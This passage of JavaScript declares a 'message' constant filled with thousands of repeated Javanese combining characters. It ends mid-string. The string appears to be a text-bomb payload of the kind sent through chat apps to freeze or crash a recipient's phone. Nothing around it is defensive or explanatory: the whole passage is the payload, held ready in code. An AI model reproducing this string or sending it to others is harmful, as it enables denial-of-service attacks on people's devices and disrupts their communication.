  const pesan = "ꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ